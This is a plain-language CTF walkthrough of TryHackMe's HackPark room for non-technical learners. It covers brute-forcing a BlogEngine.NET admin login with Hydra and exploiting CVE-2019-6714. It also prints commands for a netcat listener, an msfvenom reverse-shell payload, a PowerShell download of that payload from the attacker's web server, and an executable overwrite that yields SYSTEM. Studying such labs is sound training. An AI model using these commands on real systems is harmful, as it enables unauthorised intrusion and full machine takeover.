# HackPark CTF — Beginner's Step-by-Step Guide

> **What is this?**
> This is a guided walkthrough of a cybersecurity challenge called "HackPark" on TryHackMe. You are playing the role of an ethical hacker trying to take full control of a Windows server running a blog website. Everything is legal and contained inside TryHackMe's safe practice environment.
>
> **Who is this for?**
> Your study group members with no IT background. Every step explains **what you are doing** and **why you are doing it** in plain language.

---

## Before You Start — What You Need

| What | Where to get it |
|---|---|
| TryHackMe account | https://tryhackme.com (free) |
| HackPark room started | Search "HackPark" on TryHackMe, click "Start Machine" |
| Kali Linux running | Your VM or TryHackMe's in-browser AttackBox |
| VPN connected | Download the `.ovpn` file from TryHackMe and connect it |

**Finding your IPs (important — you'll need these throughout):**

```bash
# Your VPN IP (you'll use this as your "home address" for the target to call back to)
ip addr show tun0 | grep inet

# The target IP
# This is shown on the TryHackMe HackPark room page after you start the machine
# Example: 10.49.153.22 — yours will be different every session
```

---

## The Big Picture — What Are We Doing?

This target is a **Windows server** running a blog website called BlogEngine.NET. Think of it as a company's public-facing website hosted on a server in a data centre. Our goal:

1. **Survey the building** — scan to find what services are running (reconnaissance)
2. **Pick the front door lock** — brute force the blog admin login (exploitation)
3. **Sneak in through a broken window** — exploit a known security flaw to run our own code (CVE exploitation)
4. **Find a service elevator to the top floor** — escalate from a low-level user to full system control (privilege escalation)
5. **Collect the flags** — retrieve the hidden flag files

---

## Phase 1 — Reconnaissance (Checking the Building)

### Step 1.1 — Connect the VPN

```bash
sudo openvpn ~/Downloads/your-thm-vpn.ovpn &
```

> Replace `your-thm-vpn.ovpn` with the actual filename of your TryHackMe VPN file.

**What is this doing?**
Connecting you to TryHackMe's private network. Without the VPN, your computer and the target machine can't communicate — they're on completely separate networks.

**Why?**
The target machine only exists inside TryHackMe's network. The VPN is your tunnel in — like putting on a visitor badge to enter a secured building.

After connecting, confirm it worked:
```bash
ip addr show tun0 | grep inet
```
You should see a line starting with `inet` followed by an IP address like `10.x.x.x`. That is **your VPN IP** — keep it noted, you'll need it many times.

---

### Step 1.2 — Scan the Target

```bash
nmap -Pn -sC -sV 10.49.153.22
```

> Replace `10.49.153.22` with your actual target IP from TryHackMe.

**What is nmap?**
nmap is a **network scanner** — like a security guard walking around a building and checking which doors and windows are unlocked. Every service on a computer "listens" on a numbered port. nmap checks them all and reports which ones are open.

**What do the flags mean?**
- `-Pn` — Don't ping first, just scan (some machines don't respond to pings)
- `-sC` — Run standard detection scripts
- `-sV` — Detect what software version is running on each open port

**Why are we doing this?**
You need to understand what you're attacking before you attack it. A plumber doesn't start fixing pipes without first looking at what pipes exist. This scan gives us a map of the building.

**What you should see:**
```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 8.5
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

**What this means:**
- Port 80 = A website is running here
- Port 3389 = Remote Desktop — someone can log into this server's desktop remotely (but we need a password for that)

---

### Step 1.3 — Look at the Website

Open your browser and go to: `http://10.49.153.22`

You'll see a blog website powered by BlogEngine.NET.

**What is BlogEngine.NET?**
It's a blogging platform — like WordPress, but for Microsoft's web servers. It lets people create and publish blog posts through a website.

**Find the login page:**
Navigate to: `http://10.49.153.22/Account/login.aspx`

Note the username field — BlogEngine.NET uses `admin` as the default username in many installations. We'll try that.

---

## Phase 2 — Breaking In (Brute Forcing the Login)

### Step 2.1 — Capture the Login Request with Burp Suite

Before running Hydra, we need to capture the exact format of a login attempt.

1. Open **Burp Suite** on Kali (search for it in the applications menu)
2. Set your browser to use Burp as a proxy:
   - In Firefox: Settings → Network Settings → Manual proxy → `127.0.0.1` port `8080`
3. In Burp Suite, make sure **Intercept is ON** (Proxy tab → Intercept tab)
4. Go to the login page in your browser and try logging in with anything (e.g., `admin` / `test`)
5. Burp will capture the request — look for lines like:
   ```
   __VIEWSTATE=xxxx&__EVENTVALIDATION=yyyy&...UserName=admin&Password=test&LoginButton=Log+in
   ```
6. Right-click → **Send to Intruder** or just note the full form data

**What is Burp Suite?**
Burp Suite is a **web traffic interceptor** — like wiretapping your own phone call. It sits between your browser and the website, letting you see and modify every message going back and forth. Security testers use it to see exactly what data is being sent when you click buttons on a website.

**Why do we need to capture the request?**
The login form on this website includes hidden security tokens (`__VIEWSTATE`, `__EVENTVALIDATION`) that change every time the page loads. We need to see the exact format of a login request so Hydra can replicate it perfectly.

---

### Step 2.2 — Run Hydra to Brute Force the Password

```bash
hydra -l admin \
  -P /usr/share/wordlists/rockyou.txt \
  10.49.153.22 \
  http-post-form \
  "/Account/login.aspx:__VIEWSTATE=<PASTE_VALUE>&__EVENTVALIDATION=<PASTE_VALUE>&ctl00\$MainContent\$LoginUser\$UserName=^USER^&ctl00\$MainContent\$LoginUser\$Password=^PASS^&ctl00\$MainContent\$LoginUser\$LoginButton=Log+in:Login failed" \
  -t 30
```

> Paste the actual `__VIEWSTATE` and `__EVENTVALIDATION` values you captured from Burp Suite.

**What is Hydra?**
Hydra is an **automated password guesser**. It tries thousands of username/password combinations automatically and very quickly. Instead of you typing one password at a time, Hydra does it thousands of times per minute.

**What is `rockyou.txt`?**
A famous password list containing over 14 million real passwords that were leaked in a data breach from a website called RockYou in 2009. Because people reuse passwords, these lists are very effective for testing.

**What does `-t 30` mean?**
Run 30 parallel threads — do 30 attempts at the same time simultaneously. Like having 30 people knocking on doors at once instead of one person going door to door.

**What does `^USER^` and `^PASS^` mean?**
Placeholders that Hydra replaces with the actual username (`admin`) and each password from the list, one by one.

**Why does this work?**
The website has no limit on how many times you can try to log in. A real secure website would lock the account after 5 failed attempts. This one doesn't — so we can try millions of passwords without getting blocked.

**What you should see:**
```
[80][http-post-form] host: 10.49.153.22   login: admin   password: 1qaz2wsx
```

> **Credentials found: `admin` / `1qaz2wsx`**

Log into the website with these credentials.

---

## Phase 3 — Getting a Foothold (CVE-2019-6714)

### What is a CVE?

CVE stands for **Common Vulnerabilities and Exposures** — it's like a published security advisory. When researchers find a serious bug in software, they give it an official ID number (like CVE-2019-6714) so the whole security community can track it. CVE-2019-6714 is a known flaw in BlogEngine.NET version 3.3.6.

**The flaw in simple terms:**
BlogEngine.NET lets admins upload files for themes. A researcher discovered that by tricking the website with a manipulated web request, you can upload ANY file — including malicious code — and make the website run it. It's like a delivery service that's supposed to only accept mail but can be tricked into accepting a package that releases a gas inside the building.

---

### Step 3.1 — Start Your Listener (Terminal 1)

Open a terminal and type:

```bash
nc -lvnp 4444
```

**What is this?**
`nc` (Netcat) is waiting on your machine at port 4444 for an incoming connection. Leave this terminal open and running — it will receive the connection when the exploit fires.

Think of it as: **you've opened your front door and you're waiting for someone to knock.**

---

### Step 3.2 — Set Up the Exploit (Terminal 2)

The exploit code is already prepared in your project folder. Before running it, open `exploit_cve.py` in a text editor and update:
- The target IP → your TryHackMe target IP
- Your tun0 IP (VPN IP) → found from `ip addr show tun0`
- The admin password → `1qaz2wsx`

Then run it:

```bash
python3 ~/projects/HackPark/exploit_cve.py
```

**What is this exploit doing? (Step by step, in plain English)**

1. **Logs into the blog** using the admin credentials we found
2. **Uploads a fake theme file** (`PostView.ascx`) — this is actually a reverse shell disguised as a website theme file
3. **Tricks the website** by sending a special request that says "load this file as a theme" — pointing to our uploaded malicious file
4. **The website runs our file**, which connects back to our listener

**What is an `.ascx` file?**
A web control file used by Microsoft's web technology (ASP.NET). BlogEngine.NET loads `.ascx` files as part of themes. We're uploading a malicious one that, when loaded, runs our reverse shell code instead of displaying a theme.

**What you should see in Terminal 2:**
```
[*] Logging in...
[+] Logged in
[*] Uploading PostView.ascx...
[+] Upload: 201
[*] Triggering with theme cookie...
[+] TIMEOUT — shell executed! Check your listener!
```

> The "TIMEOUT" message is normal — it just means the connection stayed open (which is what we want).

---

### Step 3.3 — Your Shell Arrives (Terminal 1)

Look at Terminal 1 (your listener). You should see:

```
connect to [YOUR IP] from 10.49.153.22
C:\windows\system32\inetsrv>
```

Type `whoami` and press Enter:

```
C:\windows\system32\inetsrv> whoami
iis apppool\blog
```

**You are now inside the Windows server!**

**What is `iis apppool\blog`?**
A low-privileged service account — like a delivery person who has access to the loading dock but can't access the manager's office. We're inside, but we need to get higher privileges to access everything.

---

## Phase 4 — Taking Full Control (Privilege Escalation to SYSTEM)

### The Goal

We need to go from `iis apppool\blog` (limited access) to `NT AUTHORITY\SYSTEM` (full control — the highest possible user on Windows).

**What is `NT AUTHORITY\SYSTEM`?**
SYSTEM is the most powerful account on any Windows computer — even more powerful than the Administrator. The operating system itself runs as SYSTEM. If you have SYSTEM access, you own the machine completely.

---

### Step 4.1 — Generate a SYSTEM-Level Payload (Terminal 2)

First, find your VPN IP:
```bash
ip addr show tun0 | grep inet
```

Then create a malicious program:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR-TUN0-IP> LPORT=5555 -f exe -o /tmp/Message.exe
```

**What is `msfvenom`?**
A tool that creates malicious executable files. Think of it as a **trap in a box** — we're creating a Windows `.exe` file that, when run, connects back to our machine.

**What do the options mean?**
- `-p windows/x64/shell_reverse_tcp` — the type of trap (a reverse shell for 64-bit Windows)
- `LHOST=` — YOUR IP (where the target calls back to)
- `LPORT=5555` — the port on your machine that receives the call
- `-f exe` — format as a Windows executable file
- `-o /tmp/Message.exe` — save it as `Message.exe` in /tmp folder

**Why is it called `Message.exe`?**
Because there's already a program on the target server called `Message.exe` that we're going to replace. The name has to match exactly.

---

### Step 4.2 — Start a File Server (Terminal 2)

```bash
python3 -m http.server 8080 -d /tmp/
```

**What is this doing?**
Creating a simple web server on YOUR machine at port 8080, serving files from the `/tmp/` folder. This lets the target machine download files from you.

**Why?**
The target Windows server needs to download our malicious `Message.exe`. The easiest way is to make it available via a web link — then we tell the target to download it.

---

### Step 4.3 — Start SYSTEM Listener (Terminal 3)

Open a third terminal:

```bash
nc -lvnp 5555
```

**Why port 5555 (not 4444 again)?**
Port 4444 is already occupied by our existing connection. We need a second separate listener waiting for the SYSTEM-level connection on a different port.

---

### Step 4.4 — Download the Payload onto the Target (Terminal 1 — your shell)

In your existing shell (Terminal 1, where you're connected as `iis apppool\blog`), type:

```cmd
powershell -c "Invoke-WebRequest http://<YOUR-TUN0-IP>:8080/Message.exe -OutFile C:\Windows\Temp\Message.exe"
```

**What is PowerShell?**
PowerShell is Windows' advanced command line — like a more powerful version of the old Windows command prompt. `Invoke-WebRequest` is the PowerShell equivalent of downloading a file from the internet.

**Why save it to `C:\Windows\Temp`?**
The Temp folder is a location where any user can write files — it's designed for temporary files. Our low-privileged account (`iis apppool\blog`) has permission to write there.

---

### Step 4.5 — Replace the Legitimate Program

```cmd
powershell -c "Copy-Item C:\Windows\Temp\Message.exe 'C:\Program Files (x86)\SystemScheduler\Message.exe' -Force"
```

**What is this doing?**
Replacing the real `Message.exe` (a legitimate program) with OUR malicious `Message.exe` (our reverse shell trap).

**Why does this give us SYSTEM access?**
This is the clever part. On this server, there is a program called **SystemScheduler** that automatically runs `Message.exe` every 30 seconds — as `NT AUTHORITY\SYSTEM`. It's like a scheduled task that a system administrator set up.

The security mistake: the folder `C:\Program Files (x86)\SystemScheduler\` has weak permissions — our low-privileged account can write files there. So we replace the harmless `Message.exe` with our malicious one. When SystemScheduler runs it next (within 30 seconds), it runs **as SYSTEM** — and our code connects back to our listener as SYSTEM.

**Why `Copy-Item` instead of a regular copy command?**
Our shell is too limited for regular Windows commands. PowerShell's `Copy-Item` has more flexibility and works within our restricted permissions.

---

### Step 4.6 — Wait for SYSTEM Shell (Terminal 3)

Wait up to 60 seconds. Watch Terminal 3 (your second listener on port 5555).

You should see:

```
connect to [YOUR IP] from 10.49.153.22
C:\PROGRA~2\SYSTEM~1> whoami
nt authority\system
```

**You are now SYSTEM — complete control of the machine.**

---

### Step 4.7 — Collect the Flags

```cmd
type C:\Users\jeff\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

| Flag | Location |
|---|---|
| user.txt | `C:\Users\jeff\Desktop\user.txt` |
| root.txt | `C:\Users\Administrator\Desktop\root.txt` |

---

## Summary — What We Did and Why It Worked

| Step | What We Did | Why It Worked |
|---|---|---|
| 1. Scanned ports | Used nmap to find open services | Found website on port 80 |
| 2. Found login page | Browsed to the website | BlogEngine.NET login was publicly accessible |
| 3. Brute forced password | Used Hydra with rockyou.txt wordlist | No login attempt limit on the site |
| 4. Exploited CVE-2019-6714 | Uploaded disguised reverse shell | Known bug allowed file upload bypass |
| 5. Got shell as `iis apppool\blog` | Exploit connected back to our listener | Server ran our uploaded malicious file |
| 6. Replaced `Message.exe` | Overwrote legitimate program with our payload | Folder had weak write permissions |
| 7. Got SYSTEM shell | SystemScheduler ran our file automatically | Scheduled task ran as SYSTEM every 30 seconds |

---

## Glossary — Plain English Definitions

| Term | What it means |
|---|---|
| **Port** | A numbered doorway on a computer. Port 80 = website, Port 3389 = remote desktop |
| **nmap** | A scanning tool that checks which doors (ports) are open on a target |
| **Brute force** | Automatically trying thousands of passwords until one works |
| **Hydra** | A tool that automates brute force attacks |
| **Burp Suite** | A tool that intercepts web traffic between your browser and a website |
| **CVE** | A published security vulnerability with an official ID number |
| **Exploit** | Code that takes advantage of a security vulnerability |
| **Reverse shell** | Making the target computer call you, bypassing firewalls |
| **Netcat (nc)** | A tool for sending and receiving network connections |
| **Payload** | A malicious program or file that does what you want on the target |
| **msfvenom** | A tool that creates malicious executable files |
| **Privilege escalation** | Going from limited access to full control |
| **NT AUTHORITY\SYSTEM** | The highest-privileged user on Windows — the OS itself |
| **IIS** | Internet Information Services — Microsoft's web server software |
| **ASP.NET / ASCX** | Microsoft's web programming technology, used by BlogEngine.NET |
| **Scheduled task** | A program set to run automatically at regular intervals (like a phone alarm) |

---

## Troubleshooting — When Things Go Wrong

| Problem | What to check |
|---|---|
| Hydra doesn't find the password | Make sure you copied the correct `__VIEWSTATE` value from Burp Suite |
| Exploit runs but shell doesn't appear | Check your tun0 IP is correct in the exploit file. Restart listener and try again |
| `Invoke-WebRequest` fails | Confirm your Python HTTP server (port 8080) is still running in Terminal 2 |
| Copy-Item fails | Use exactly the PowerShell command shown — cmd copy won't work in this shell |
| SYSTEM shell doesn't arrive | Wait a full 60 seconds. SystemScheduler runs every ~30 seconds. If still nothing, re-run the Copy-Item command to make sure the file was replaced |
| Target machine is unresponsive | Go to TryHackMe and request a new machine — update IP in exploit script |
